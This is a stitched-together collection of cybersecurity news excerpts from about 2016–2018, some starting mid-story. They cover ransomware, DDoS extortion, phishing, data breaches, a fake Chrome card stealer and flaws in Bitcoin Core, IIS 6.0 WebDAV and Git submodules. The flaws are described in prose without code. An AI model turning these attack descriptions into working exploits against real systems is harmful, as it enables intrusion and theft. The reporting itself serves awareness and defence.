A major concern for cybersecurity experts is the fileless attacks, which are hard to detect. These attacks do not install a malicious software to infiltrate a victim’s computer, which makes it difficult for anti-virus solutions to detect them. According to Ponemon Institute, 35% of all cyberattacks in 2018 were fileless, while security solution provider Carbon Black claims that fileless attacks accounted for 50% of all successful data breaches targeting financial businesses.
Fileless attacks target legitimate Windows tools such as PowerShell (a scripting language which can provide hackers unrestricted access to Windows API) and Windows Management Instrumentation (used by admins). By latching on to these tools, hackers gain control over the PC and eventually the organization’s database.
In another recent development, researchers at F-Secure have come across a new vulnerability affecting PCs. Dubbed as cold boot, the attack can be carried off using a special programme through a USB drive connected to a PC. Using the programme, the hacker can disable the memory overwriting by rebooting the system, without a proper shutdown. The attack can be used to break into company system which might have access to the company network.

The Bitcoin Core team yesterday released a patch for a DDoS vulnerability that could prove fatal to the Bitcoin network.
The patch note urged miners to shut down their older versions urgently and replace them with the new version, Bitcoin Core 0.16.3. The announcement, first reported on Hacked, revealed that all the recent Bitcoin Core versions could be vulnerable to Distributed Denial-of-Service attack. An attack of such kind typically involves multiple compromised systems to flood a single system (or network) – similar to zombies encircling an uninfected person and disabling his movements.
DDoS perpetrators could attack a Bitcoin network by either flooding the block with duplicate transactions, thus jamming the transaction confirmation of other people, or by flooding the nodes on Bitcoin’s peer-to-peer network, thus over-utilizing the bandwidth through malicious transaction relays. The recent DDoS vulnerability, termed as CVE-2018-17144, tried to attempt the latter – flooding full node operators with traffic. Hacked reports:
    “The way the potential exploit could work was by allowing anyone who was capable of mining a sufficient number of proof of work blocks to crash Bitcoin Cores running software versions 0.14.0 to 0.16.2.”
It also means that the miners who occasionally run Bitcoin Core were not vulnerable to the attack. Still, developers recommended all the miners to go ahead with the latest update to stay safe. Also, the patch fixed some other minor bugs related to consensus, RPC, invalid flag errors, and documentation.
It is worth noticing that Bitcoin is not the only cryptocurrency that is on the DDoS attackers’ hitlist. Flaws have been found in other cryptocurrency clients as well, including Bitcoin Cash and Ethereum. An effective attack on the Ethereum network lasted more than a month and created million of dead accounts. In response, developers had to go through two on-chain forks and one off-chain process to clean up the mess.
In another DDoS attack that slowed down the Ethereum network, miners had to increase gas fees to repel the attackers. There was no consensus failure.
DDoS continues to be a global problem that impacts all spheres of the internet. Europol in its latest investigative report noted:
    “Criminals continue to use Distributed-Denial-of-Service (DDoS) attacks as a tool against private business and the public sector. Such attacks are used not only for financial gains but the ideological, political or purely malicious reason. This type of attack is not only one of the most frequent (second only to malware in 2017); it is also becoming more accessible, low-cost and low-risk.”
Meanwhile, decentralized networks like Bitcoin are still more secure against such attacks purely because single entities would not be able to bring them down.
Also, because the people, including the attackers themselves, are heavily invested in Bitcoin, a coordinated attack would just rip them off their bitcoin validation commissions.

A bug in the way that Mobile Safari handles pop-up dialogs has been abused to scare iOS users into paying a “fine” in the form of an iTunes pre-paid card.
“This attack was initially reported to Lookout’s Support desk by one of our users running iOS 10.2.
“The user provided a screenshot showing a ransomware message from pay-police[.
]com, with an overlaid ‘Cannot Open Page’ dialog from Safari.
Each time he tapped ‘OK’ he would be prompted to tap ‘OK’ again, effectively putting the browser into an infinite loop of dialog prompts that prevented him from using the browser”.
The scammers have purchased a large number of different domains, and equipped them with obfuscated JavaScript code that would trigger the bug in Mobile Safari.
The intended targets were mostly from English-speaking countries: the US, the UK, Ireland, Australia and New Zealand.
The attack was contained within Safari’s sandbox, so the victims’ devices were not actually compromised.The attackers banked on users’ fear and shame to pull the scam off.
Lookout notified Apple of the attack, and the iThings manufacturer fixed the abused flaw in iOS 10.3, which was released on Monday.
“The pop-up window error dialog on newer versions of iOS is actually the result of Mobile Safari not being able to find a local URL lookup, so it fails, but keeps presenting the dialog message due to the infinite loop in the code,” the researchers explained.
“The attack, based on its code, seems to have been developed for older versions of iOS, such as iOS 8.
However, the abuse of pop-ups in Mobile Safari was still possible until iOS 10.3”.
With the new iOS version, these pop-ups won’t be locking the entire browser, but just that one tab, which can be simply closed and the user can continue using the browser like nothing happened.
Users are advised to update their iOS-running iThings to version 10.3 to close up this particular attack vector.

In a disclosure on March 27 that included their own simple Python proof-of-concept, the researchers outlined the “buffer overflow in the ScStoragePathFromUrl function in the WebDAV service” when an attacker sends an overlong IF header request as part of a PROPFIND request (if that sounds obscure you can read about WebDAV here).
Designated CVE-2017-7269, that’s bad news, but the fact that it has been known about for months – with new exploits now likely – is the main takeaway.
Given that IIS 6.0 shipped with Windows Server 2003 R2 in 2005 and Microsoft stopped supporting it after the end of life deadline passed in July 2015 (ie no more patches), one might assume that the install base is small.
More likely, this is another version of the Windows XP situation where organisations find it hard to wean themselves off core software and end up putting themselves at risk.
In 2015, research from analysts RiskIQ found 2,675 installs of IIS 6.0 inside 24 of the top FTSE-100 UK companies alone.
Incredibly, the same analysis found 417 installs of IIS 5.0 in the same companies, which at that time was a year beyond extended support death.
Shodan estimates 600,000 machines still visibly running this software globally, perhaps 10% of which have the PROPFIND extension running according to an analysis by one enterprising researcher.
Nobody knows, but with Microsoft unlikely to step in with a fix, it could be more than enough to cause problems.
The premium fix is to stop using IIS 6.0 immediately but for anyone who finds that difficult there is one hope: guerrilla patching.
We discussed this phenomenon in our recent coverage of Google’s “Operation Rosehub”, but it can be summed up by the simple idea that if the vendor in whose software a vulnerability has arisen can’t or won’t fix the issue then someone else does it for them.
A company called Acros Security dubbed this the “0patch” and, lo and behold, has come up with a “micro-patch” for CVE-2017-7269.
We can’t vouch for this but Acros explains how developed this in some detail for anyone staring down the barrel of limited options.
What the latest episode challenges is the fixed idea of software lifecycles according to big software vendors, which runs something like “we’ve told them in advance that support will be removed by a given date so if they don’t follow our advice and upgrade then that’s their lookout”.
The near debacle of XP’s zombie afterlife was an example of this MO running aground on the rocks of business reality, beside which the latest IIS 6.0 event might look modest.
But an unpatchable zero-day affecting hundreds of thousands of compromised web servers won’t be fun for anyone – Microsoft included.

As of June 2016,  more than 150 million active users interact with one another daily via Snapchat.
Others are drawn by the service's more recent features.
Those include Snapcash, a method introduced for users to send mobile payments to their friends.
Given the app's popularity, it's no wonder online criminals have set their sights on hacking users' Snapchat accounts.
For instance, back in late 2013, a group of hackers published a database containing the usernames and phone numbers of approximately 4.6 million Snapchat users.
Nefarious individuals could have used that information to profile targets across multiple web accounts.
We also can't forget about the security incident that occurred back in February 2016.
In that attack, someone posed as the company's CEO and convinced a Snapchat employee to send over payroll information.
The successful phish ultimately compromised dozens of employees' identities.
To be fair, a mega breach on the scale of what affected LinkedIn, Tumblr, and Yahoo has yet to strike the messaging app.
But that's not to say criminals aren't trying to find a way into people's accounts.
Hackers clearly have Snapchat in their sights, which is why users need to learn how to spot the warning signs of a hack and how they can recover their accounts if someone compromises them.

One needs to be always aware of Tax Scams, including tax refund scams, which are carried out by scamsters who pretend to be from the IRS of USA, HMRC of UK, CRA of Canada, Income Tax Department of India and such. Scamsters contact you via fake emails, phone calls, recorded message, SMS, etc, and either scare you with the possibility of some legal action or entice you with a tax refund!
Every tax season, Tax Scams start doing the rounds. Emails, Phone calls, or recorded messages by cybercriminals impersonating authentic tax agents have become an order of the day and continue to remain a major threat to taxpayers.
The scam artists use sinister designs that threaten police arrest, deportation, and even license revocation. With the increases in its popularity, fraudsters are also busy finding more ways to increase efficiency. Earlier, the major targets were elderly people and immigrant population. Slowly, the focus has shifted to methods that rely on auto-dialers, robocalling, and voice mail messages to hit as many taxpayers as possible.
The story begins with an automated call. It plays a recorded message warning you that it’s “the final notice” from the tax agency such as the Internal Revenue Service, Indian Income Tax Department, HM Revenue and Customs, or the Tax department of your country. Or it could begin with an email. In any case, the recorded voice or email purports to be from tax inspector and goes on to specify about the course of action, the agency is likely to follow against you like, planning a lawsuit against you, and if you don’t return this call, you could land up in jail, soon.
Attacks, such as these use fear as bait or the lure of a tax refund on the other hand. They rely on social engineering tactics. One such message tells recipients that there’s a pending law enforcement action against them as they have evaded tax. It is mainly used to target U.S. taxpayers. The scam pretends to contain information about a subpoena.
It could contain a web link which it wants you to click. The link could take you to a fraudulent website. Or the email could include an attachment. The file is a “document file” that Microsoft Word opens in Protected View. It contains an instruction to Enable Editing. If the Enable Editing button is clicked, malicious Macros in the ‘document’ downloads a malware. So one needs to always exercise utmost caution in either of the cases.

Intel is reporting a firmware vulnerability that could let attackers take over remote management functions on computers built over nearly the past decade.
The vulnerability, disclosed on Monday, affects features in Intel firmware that are designed for enterprise IT management.  
Enterprises using Intel Active Management Technology, Intel Small Business Technology and Intel Standard Manageability on their systems should patch them as soon as possible, the company says.
The vulnerable firmware features can be found in some current Core processors and all the way back to Intel's first-generation Core, called Nehalem, which shipped in 2008. They're part of versions 6.0 through 11.6 of Intel's manageability firmware.
No consumer PCs are affected, the company said. Nor are data-center servers running Intel Server Platform Services.
Intel Active Management Technology is a feature in Core processors that lets organizations remotely track, manage and secure whole fleets of connected computers.
For example, it can be used to monitor and repair retail checkout systems, digital signage and PCs at places like stores, offices and schools.
Intel didn’t provide technical details of the vulnerability, but it said a hacker could use the flaw to take over the remote management functions.
In an email, Intel said it learned about the vulnerability from a security researcher in March. “We are not aware of any exploitation of this vulnerability,” the company said.
Intel said it has prepared a patch and is working with manufacturers to roll it out to users as soon as possible.
Intel’s security advisory also lays out steps users can take to find out if they’re affected. For example, PCs built with its vPro technology will have the vulnerable Intel Active Management feature.

The Git Project announced yesterday a critical arbitrary code execution vulnerability in the Git command line client, Git Desktop, and Atom that could allow malicious repositories to remotely execute commands on a vulnerable machine.
This vulnerability has been assigned the CVE-2018-17456 ID and is similar to a previous CVE-2017-1000117 option injection vulnerability. Like the previous vulnerability, a malicious repository can create a .gitmodules file that contains an URL that starts with a dash.
By using a dash, when Git clones a repository using the --recurse-submodules argument, the command will interpret the URL as an option, which could then be used to perform remote code execution on the computer.
""When running ""git clone --recurse-submodules"", Git parses the supplied .gitmodules file for a URL field and blindly passes it as an argument to a ""git clone"" subprocess.  If the URL field is set to a string that begins with a dash, this ""git clone"" subprocess interprets the URL as an option.  This can lead to executing an arbitrary script shipped in the superproject as the user who ran ""git clone"".""
This vulnerability has been fixed in Git v2.19.1 (with backports in v2.14.5, v2.15.3, v2.16.5, v2.17.2, and v2.18.1), GitHub Desktop 1.4.2, Github Desktop 1.4.3-beta0, Atom 1.31.2, and Atom 1.32.0-beta3.
The Git Project strongly recommends that all users upgrade to the latest version of the Git client, Github Desktop, or Atom in order to be protected from malicious repositories.

Now, more than ever, a recent report suggests that India ranks second in ransomware attacks, this does not come as a surprise to many, especially the industry experts, considering that the country’s current state of digital security isn’t geared up to handle the emerging threats.
It’s very likely that India tops the list soon, considering the rapid growth of ransomware.
To compound it, the growth in “Internet of Things” (IoT) industry and the vulnerability towards cyber infections will further fuel new types of malware threats.
We had reported earlier in our findings that over 180 Indian companies were victims of Ransomware online extortion schemes in the first six months of the year 2016, causing a loss of whopping $3 billion.
However, the latest industry reports show a rather grim picture around Ransomware - the findings indicate that businesses in India are most at risk to cyber security attacks globally, with organizations in the country experiencing the highest number of weekly security incidents of all Asian countries surveyed (14.8 per cent).
At the heart of it, Ransomware is a class of malware that’s designed for moneymaking with clear criminal intent.
The puzzling part about Ransomware is that, no matter what the situation is, even if the ransom is paid, there is no guarantee that computer users will be able to fully access their systems ever again.
The criminal may flee with the money and the files- both!
While some hackers instruct victims to pay through Bitcoin, MoneyPak or other online methods, attackers could also demand credit card data, adding another level of financial loss altogether.
Cryptolocker, Petya and Dogspectus are three of the major ransomware making their presence felt strongly.
Just like kidnapping for ransom, it’s a virtual kidnapping of data where information is kept as a hostage and money is demanded in exchange of freeing the hostage.
We all know how much damage a data breach can cost- monetarily as well as reputation wise.
Once a ransomware attack strikes, clicking of files yield no results.
The malware has corrupted the files and converted them into foreign MP3 files or an encrypted RSA format.
And then, the victim gets a note in a text file or HTML file: “Help_Decrypt_Your_Files”.
In a majority of the cases, once ransomware enters a system, there is no way a user can remove it without losing some files or data, even if one pay the ransom.
Of late, ransomware has even left behind advanced persistent threat (APT) network attacks to grab the numero uno spot in the list of deadliest cyber crimes.
Ransomware is fast evolving in form and increasing in number as well, thereby making it more difficult to protect against it.
Each version has some properties that are unique to that version alone.
This is scary because what is means is, if someone finds a solution to block or erase one version of a malware, that same solution may not work for the newer versions.
However, a vast number of ransomware variants are still utilizing the same type of encryption technologies to infect systems.
And what’s more, these encryption technologies are not just limited to common ones like Tor or I2P communication, but beyond.

French presidential candidate Emmanuel Macron's campaign team confirmed on Wednesday that his party had been the target of a series of attempts to steal email credentials since January but that they had failed to compromise any campaign data.
Macron's party, known as ""En Marche!"" or ""Onwards"", said it had been hit by at least five advanced ""phishing"" attacks that involved trying to trick a broad number of campaign staff members to click on professionally-looking fake web pages.
The latest attacks were confirmed by security firm Trend Micro , whose researchers found links to a cyber espionage group it has dubbed Pawn Storm, the Macron team noted. Other experts link the group, also known as ""Fancy Bear"" or ""APT 28"", to Russian military intelligence agency GRU.
Russia has denied involvement in attacks on Macron's campaign.
Macron, an independent centrist who has been critical of Russian foreign policy, faces far-right leader Marine Le Pen in France's presidential runoff on May 7. Le Pen has taken loans from Russian banks and has called for closer ties with Moscow. 
""Emmanuel Macron is the only candidate in the French presidential campaign to be targeted (in phishing attacks),"" his party said in a statement, adding this was ""no coincidence"".
In mid-February, an En Marche! official told a news conference the party was enduring ""hundreds if not thousands"" of attacks on its networks, databases and sites from locations inside Russia and asked the French government for assistance.
The Macron campaign said on Wednesday it had carried out counter-offensive actions against the fake web sites, which were designed to trick campaign workers into divulging their user credentials. As a further precaution, it also said En Marche! does not use email to share confidential information.

A group calling itself XMR Squad has spent all last week launching DDoS attacks against German businesses and then contacting the same companies to inform them they had to pay €250 ($275) for ""testing their DDoS protection systems.""
German DDoS protection firm Link11 reported attacks against DHL, Hermes, AldiTalk, Freenet, Snipes.com, the State Bureau of Investigation Lower Saxony, and the website of the state of North Rhine-Westphalia.
The attack against DHL Germany was particularly effective as it shut down the company's business customer portal and all APIs, prompting eBay Germany to issue an alert regarding possible issues with packages sent via DHL.
""They seem to know what to hit,"" said Daniel Smith, security researcher for Radware, and one of the persons currently keeping tabs of the attacks.
The group sent emails to all the companies it targeted. In the emails, they didn't ask for a ransom to stop the attacks, but a fee for having already carried out what they called a DDoS protection test.
Usually, these types of groups launch DDoS attacks and then send emails to their victims requesting for payments to stop the attacks. XMR Squad's emails looked like invoices for unrequested DDoS tests.
Furthermore, the ransom note didn't include payment instructions, which is weird, to say the least. DDoS ransoms are usually handled in Bitcoin or another anonymous cryptocurrency. It was strange to see the group ask for payment in Euros, as the group's name included the term XMR, the shortname for Monero, an anonymous cryptocurrency.
While the group advertised on Twitter that their location was in Russia, a German reporter who spoke with the group via telephone said ""the caller had a slight accent, but spoke perfect German.""
To the same reporter, the group also claimed they carried out the attacks only to get public attention. The attention they got wasn't the one they expected, as their hosting provider took down their website, located at xmr-squad.biz.
Germany, in particular, has been the target of several DDoS blackmailers in the past year. In January and February, a group calling itself Stealth Ravens launched DDoS-for-Bitcoin ransom attacks.
Link11, who tracked those attacks, claimed the group used a DDoS botnet built with the Mirai IoT malware and asked for 5 Bitcoin ($6,000) to stop attacks.
Last year in June, another group named Kadyrovtsy also targeted German businesses, launching attacks of up to 50 Gbps. This group began DDoS ransom attacks a month earlier by first targeting Polish banks.
All these groups are following the same modus operandi perfected by groups like DD4BC and Armada Collective. These two groups appeared in the summer and autumn of 2015 and targeted companies worldwide. In January 2016, Europol arrested suspects believed to be DD4BC members in Bosnia and Herzegovina. Following the arrests, both groups became inactive.
After the demise of these two main groups, there was a wave of copycats [1, 2, 3, 4, 5] that used their respective reputation to extort payments from companies, in many cases without even possessing any DDoS capabilities.

Cybersecurity  researchers MalwareHunterTeam has uncovered a new botnet malware type it has dubbed GhostAdmin that is alive and working in the wild.
GhostAdmin allows cybercriminals to take control of a computer using an Internet Relay Chat (IRC) channel, according to BleepingComputer MalwareHunterTeam believes the new botnet is an updated version of the old CrimeScene botnet malware.
“The malware works by infecting computers, gaining boot persistence, and establishing a communications channel with its command and control (C&C;) server, which is an IRC channel,” BleepingComputer wrote.
Once this is accomplished GhostAdmin accesses the IRC channel and begins to issue commands to its botnet army of infected computers.
The researchers were able to access one GhostAdmin user named Jarad who managed to infect his own computer with the malware helping MalwareHunterTeam gain access to the FTP server being used.
Here they found screenshots of Jarad's computer and data from an internet cafew and an unnamed lottery company.
The data stolen includes names, dates of births, phone numbers, emails, addresses, employer information.

Yahoo, Adult Friend Finder, LinkedIn, Tumblr and Daily Motion all have something in common: in 2016, details of massive hacks perpetrated against the companies were disclosed. The firms represent a handful of the companies and public bodies around the world that suffered at the hands of hackers last year. Data compromised usually included names, emails, and physical addresses, and even personal bank details, ethnicity data, and phone numbers.
And the hacks aren’t stopping anytime soon. 2017 has already been dominated by numerous data breaches and the most recent affects the Association of British Travel Agents, commonly known as ABTA.
To keep you in the loop on data breaches this year, WIRED will keep a running tally of successful hacks.
The abta.com web server for the Association of British Travel Agents (ABTA) was recently hacked by “an external infiltrator” who exposed the details of 43,000 individuals. Around 1,000 of these included files that could include personal identity information of customers of ABTA members uploaded since 11 January 2017, while around 650 may also include personal identity information of ABTA members. As the UK’s largest travel association, ABTA’s members include travel agents and tour operators.
The unauthorised access was said to be possible due to a system vulnerability “that the infiltrator exploited” to access some data provided by some customers of ABTA Members and by ABTA Members themselves. On immediate investigation, ABTA said it identified that although ABTA’s own IT systems remained secure, there was a vulnerability to the web server managed for ABTA through a third-party web developer and hosting company.
“This, unfortunately, means some documentation uploaded to the website, as well as some information provided by customers, may have been accessed,” ABTA’s CEO, Mark Tanzer said. As a precautionary measure, it has taken steps to warn its members and customers of ABTA members who have the potential to be affected. The group has also alerted the relevant authorities, including the Information Commissioner (ICO) and the police.

PGA of America computers were infected this week with a strain of malicious software that locked down critical files and demanded cryptocurrency for their return.
Officials discovered on Tuesday that servers had been targeted in a ransomware attack that  blocked them from obtaining access to material relating to major golf tournaments, including this week’s PGA Championship at Bellerive Country Club. Some signage had been in development for over a year and could not be reproduced quickly, Golfweek reported.
The extortion threat was clear: Transfer bitcoin to the hackers or lose the files forever. “Your network has been penetrated. All files on each host in the network have been encrypted with a strong algorythm (sic),” a ransom read. “Backups were either encrypted or deleted or backup disks were formatted.” The note claimed shutting down the system may damage files.
The notice included a bitcoin wallet number—where funds could be sent—and a warning that there was no way to get access to the files without a decryption key. The hackers that said they would prove their “honest intentions” to the PGA of America by unlocking two files free-of-charge.
A source who asked not to be named told Golfweek that officials had no intention of paying the ransom demand—following the advice of most law enforcement officials and cybersecurity experts. The network remained locked on Wednesday and external researchers are still investigating.
PGA of America has declined to comment.
The golfing association did not reveal what ransomware infected its computers. But tech website Bleeping Computer found the demand matched the BitPaymer variant. Researcher Lawrence Abrams said one previous extortion scheme asked for 53 bitcoins, equivalent to $335,000.
Abrams described BitPaymer as a “secure ransomware” and said the PGA would either have to rely on backups to regain access to its files or pay the significant bitcoin demand.

The Privacy Commissioner for Personal Data, Hong Kong (Privacy Commissioner), Mr Stephen Kai-yi WONG, expressed serious concern over the Cathay Pacific Airways data breach incident, noting that the incident might involve a vast amount of personal data (such as name, date of birth, passport number, Hong Kong Identity Card number, credit card number, etc) of local and foreign citizens. The office of the Privacy Commissioner for Personal Data, Hong Kong (PCPD) would proactively contact the airline and initiate a compliance check. The Privacy Commissioner advised the airline to notify the affected clients as soon as possible, and take remedial steps with details explained immediately.
Mr Wong said that organisations must take effective security measures to protect the personal data of its clients. If an external service provider is engaged as a data processor, the organisation must adopt contractual or other means to safeguard personal data from unauthorised or accidental access, processing or use.
Mr Wong reminded members of the public that if they find any abnormalities with their personal accounts of the airline concerned or credit card accounts, they should contact the airline and the related financial institutions.  They should also change the account passwords and enable two-factor authentication to protect their personal data.
Mr Wong stated that while reporting of data breach is voluntary, any organisation concerned is encouraged to notify the PCPD.  By doing so, the PCPD can work together with the organisation to minimise the potential damage to clients.

The Intercontinental Hotels Group (IHG) has been forced to reveal yet another major data breach of customer card details over the latter part of 2016.
In a lengthy missive on Friday, the group explained that an unspecified number of IHG hotels run as franchises were affected between September 29 and December 29 last year.
It added:
“Although there is no evidence of unauthorized access to payment card data after December 29 2016, confirmation that the malware was eradicated did not occur until the properties were investigated in February and March 2017…
""The malware searched for track data (which sometimes has cardholder name in addition to card number, expiration date, and internal verification code) read from the magnetic stripe of a payment card as it was being routed through the affected hotel server. There is no indication that other guest information was affected.”
IHG-branded hotels which had implemented the firm’s Secure Payment Solution (SPS) – a point-to-point encryption (P2PE) payment acceptance product – are said to have been protected from the malware’s attempts to find card data.
Although the hotel group didn’t explicitly mention how many outlets and/or customers may have been affected, a list of hotels impacted by the breach reveals a huge number across the US and Puerto Rico.
Ilia Kolochenko, CEO of High-Tech Bridge, argued that the hotel industry remains relatively poorly secured.
“I frequently face well-known hotel brands asking to send a passport and two-sides of a credit card by email, or having their reception laptops connected to free Wi-Fis for guests,” he explained.
“Such carelessness and negligence will unavoidably lead to huge data breaches, the majority of which will not be ever detected due to lack of technical skills and resources. Strict regulation, besides PCI DSS and the approaching GDPR, is certainly required to make hotel business safe.”
Hyatt, Marriott, Starwood and Intercontinental hotels were hit with point-of-sale malware revealed in August last year.
Like the current IHG breach, it was the firms’ card providers that alerted them, revealing a worrying lack of internal threat detection capabilities.

The app is still active at the time of writing and sends collected user details to an AOL email address.
Discovered today by MalwareHunter, this application goes above and beyond of what other card stealers have attempted, most of which are half-baked efforts, often easy to recognize as malicious applications thanks to their quirky graphics and misaligned designs.
This app, named ""Betaling - Google Chrome.exe"", tries to pass as the Google Chrome browser and does a good job at it.
Betaling isn't a perfect Google Chrome, though, as there are a few clues that experienced users can spot.
For starters, the malicious app requires users to have installed a minimum version of .NET Framework 4.0 or higher, a requirement the real Google Chrome never had.
Second, the app also uses the standard Windows 8/8.1/10 Metro style, even when running on a Windows 7 PC.
Third, while Betaling tries to trick users into thinking it's the real Chrome, outside of the lock icon and the address bar, the rest of the Chrome UI is missing, such as the tab bar, the menu, Chrome buttons, and others.
Users can't resize the window, can't minimize it, can't make it fullscreen, can't drag it, and can't enter a new URL.
Nevertheless, much less sophisticated malware has been able to infect hundreds or thousands of users in the past, which means Betaling and its UI can be quite effective.
Several security researchers who've taken a look at Betaling were impressed by its carefully crafted design.
Non-infosec people thought Betaling was a phishing page loaded inside a Chrome browser, and only some time later realized they weren't looking at a Chrome window to begin with.
Currently, Betaling's interface is only available in Dutch, which reveals the malware's current target.
The form displayed inside the fake Chrome window isn't blind to user input like most phishing pages, and some data validation takes place, yielding two sorts of errors.
If correct the data is entered, Betaling collects all information and sends it to an AOL email address at whatsapp.hack@aol.com.
This email address was discovered when security researchers analyzed the application's source code.
Accessing its inbox, they've discovered recent logs, including the test data entered during Bleeping Computer's tests, meaning the app works just fine.
Besides recent logs from Betaling, researchers also found logs from an unidentified keylogger.
These logs went back as far as January 2016 and included details from victims from all over the world.
""It's been long since he got any [keylogger] logs,"" said a security researcher that goes by the name of Guido, who also analyzed the malware.
Guido, who already reported the malware to authorities, says the initial entries for the keylogger logs contained a series of recurring email addresses.
Common sense dictates these are the author's own emails, which he used for testing, during the keylogger's development and subsequent rollout.
These two emails, patrick***@live.nl and patrick*******@gmail.com, are also linked to accounts on the Spokeo social network.
Furthermore, Betaling's PDB file includes a compilation path of ""C:\Users\Patrick\"", and the Betaling EXE file is also self-signed by an invalid certificate authority named ""CN = DESKTOP-PC\Patrick"".
Both mentions of the ""Patrick"" name are consistent with the two email addresses found in the keylogger's first log entries.
It's now up to authorities to investigate and determine if the owner of the two email addresses is behind Betaling or not.
Furthermore, Guido told Bleeping Computer that in August 2016, ""Patrick"" sent an email from the AOL account to ankit******@speedpost.net asking for help with a ""stealer"" that was having several bugs.

Rumor has it that a gang of hackers—or possibly, one lonesome individual—holds the power to remotely wipe millions of iPhones and iCloud accounts, unless Apple coughs up some ransom money by April 7.
The gang calls themselves the ""Turkish Crime Family,"" and they're demanding $75,000 in Bitcoin or Ethereum cryptocurrency. In a bizarre twist, they're also willing to accept $100,000 in iTunes gift cards as an alternative form of payment, despite the obvious concern that Apple would easily be able to track this. In return, the hacker group would delete their entire collection of compromising data.
According to Motherboard, a hacker has been quoted as saying:
I just want my money and thought this would be an interesting report that a lot of Apple customers would be interested in reading and hearing.
Apparently, one of the hackers shared screenshots of emails exchanged between the group and Apple, and then gave Motherboard's Joseph Cox access to the email account as proof.
The hackers claim to have over 300 million Apple email accounts, including ones with @icloud and @me domains. Later on, though, another hacker from the group claimed that they actually have 559 million accounts. The only other proof they provided was a YouTube video of the hackers allegedly logging into an elderly woman's stolen iCloud account to view backed-up photos, then wiping her device, but this video has since been removed.
Lending to the credibility of the hackers' claims, though, Apple is stated to have asked the hacker group to remove the video from YouTube:
We firstly kindly request you to remove the video that you have uploaded on your YouTube channel as it's seeking unwanted attention, second of all we would like you to know that we do not reward cyber criminals for breaking the law.
Cox also states that he read other emails in their account, and that it appeared the hackers have tried to approach many different media outlets to get more attention, possibly to help their extortion efforts.
Now, we don't know how true the Turkish Crime Family's claims are, but this is a good time to remind you to frequently change your passwords. Make them strong and unique, people! No names, birthdays, 123s, or whatnot.

CHESAPEAKE, Va. - An attack on computers at Grassfield High School has students and parents concerned. Chesapeake Public Schools says a malware attack is responsible for taking the school off the grid.
The school district said a virus entered their network through phishing emails sent to employees. Only a couple of divisions have been affected and it's not a system-wide outage. However, it impacted Grassfield High School in a big way. Classes heavily relying on technology were affected, but the others carried on as usual.

Hackers are likely exploiting the easy-to-find vulnerabilities, according to the security researcher who warned the Pentagon of the flaws months ago.
The vulnerable systems could allow hackers or foreign actors to launch cyberattacks through the department's systems to make it look as though it originated from US networks.
Dan Tentler, founder of cybersecurity firm Phobos Group, who discovered the vulnerable hosts, warned the flaws are so easy to find that he believes he was probably not the first person to find them.
""It's very likely that these servers are being exploited in the wild,"" he told me on the phone.
While the Pentagon is said to be aware of the vulnerable servers, it has yet to implement any fixes -- more than eight months after the department was alerted.
It's a unique case that casts doubts on the effectiveness of the Trump administration's anticipated executive order on cybersecurity, which aims to review all federal systems of security issues and vulnerabilities over a 60-day period.
The draft order was leaked last week, but it was abruptly pulled minutes before it was expected to be signed on Tuesday.
Tentler, a critic of the plans, argued that the draft plans are ""just not feasible.""
""It's laughable that an order like this was drafted in the first place because it demonstrates a complete lack of understanding what the existing problems are,"" he said.
""The order will effectively demand a vulnerability assessment on the entire government, and they want it in 60 days?
It's been months -- and they still haven't fixed it,"" he said.
In the past year, the Pentagon became the first government department to ease up on computer hacking laws by allowing researchers to find and report bugs and flaws in systems in exchange for financial rewards.
Trump aides' use of encrypted messaging may violate records law
Using disappearing messages in government could be a ""recipe for corruption,"" says one expert.
Researchers must limit their testing to two domains -- ""defense.gov"" (and its subdomains) and any "".mil"" subdomain.
In an effort to pare down the list of hosts from ""all public Department of Defense hosts"" to ""only the ones in scope,"" Tentler was able to identify several hosts that answered to the domain names in scope.
""There were hosts that were discovered that had serious technical misconfiguration problems that could be easily abused by an attacker inside or outside of the country, who could want to implicate the US as culprits in hacking attacks if they so desire,"" he told me.
""The flaw could allow politically motivated attacks that could implicate the US,"" he added.
In other words, a foreign hacker or nation-state attacker could launch a cyberattack and make it look like it came from the Pentagon's systems.
Tentler argued that the hosts were covered by the scope of the wildcard domains.
A Pentagon spokesperson confirmed Tuesday that the vulnerabilities had been fixed, and encouraged researchers to continue to submit bugs and vulnerabilities, which are covered under the Pentagon's vulnerability disclosure policy.

ESET discovered 13 mobile applications on the Google Play Store that were phishing for Instagram credentials and stealing them to a remote server 
Global cybersecurity provider ESET, claims to have discovered 13 apps on Google Play Store that steal Instagram credentials.
These apps, as stated by ESET, target Instagram users who are wanting to either manage or boost the number of followers.
Under the detection name Android/Spy.Inazigram these 13 applications were phishing for Instagram credentials and stealing them to a remote server.
ESET claims that these apps seem to have originated from Turkey, some apps used English localization to target Instagram users worldwide and have been installed by 1.5 million users.
Post notification by the company the apps were removed from the Google Play Store.
To lure users into downloading, the apps promised a rapid increase in the number of followers, likes and comments for an Instagram account.
The credentials entered into the form were then sent to the attackers’ server in plain text.
The compromised accounts were used to raise follower counts of other users.
ESET believes that apart from an opportunity to use compromised accounts for spreading spam and ads, there are various business models in which the most valuable assets are followers, likes and comments.
All the applications employed the same technique of harvesting Instagram credentials and sending them to a remote server.
Interestingly, the Instagram account might appear to have increased following and follower numbers, but the user would be getting replies to comments which have never posted.
If the attackers were successful and the user did not recognize the threat upon seeing Instagram’s notification, the stolen credentials could be put to further use.
The company suggests that users should uninstall the apps from the application manager or use a reliable mobile security solution to remove the threats.
Change the Instagram password and if the password is same for other platforms it should be changed as well, as malware authors are known to access other web services using the stolen credentials.
When downloading third party applications from Google Play Store, ESET states that users should not use sensitive information and check if the apps can be trusted by checking the popularity of the developer through the number of installs, content of its reviews and ratings.

Attacker forges security certificates, sends emails to government offices and private citizens.
In the past few days, the National Authority for Cyber Security has seen evidence of planned cyber attacks on various targets in the Israeli marketplace.
The Authority analyzed the evidence and uncovered the attacker's plan, as well as the different points of application he had used.
Their analysis showed the attacker sent emails under the guise of a legitimate organization and attempted to attack 120 organizations, government offices, public institutions, and private citizens.
He also forged security certificates, masquerading as a safe company.
The National Authority for Cyber Security is continuing its efforts to block the threat, and is working to publish guidelines and suggestions to help the Israeli marketplace avoid future attacks of the same type.
The guidelines will be published on the Authority's website.

For their attacks, the groups are using a zero-day in Apache Struts, disclosed and immediately fixed last month by Apache.
The vulnerability, CVE-2017-5638, allows an attacker to execute commands on the server via content uploaded to the Jakarta Multipart parser component, deployed in some Struts installations.
According to cyber-security firms F5, attacks started as soon as Cisco Talos researchers revealed the zero-day's presence and several proof-of-concept exploits were published online.
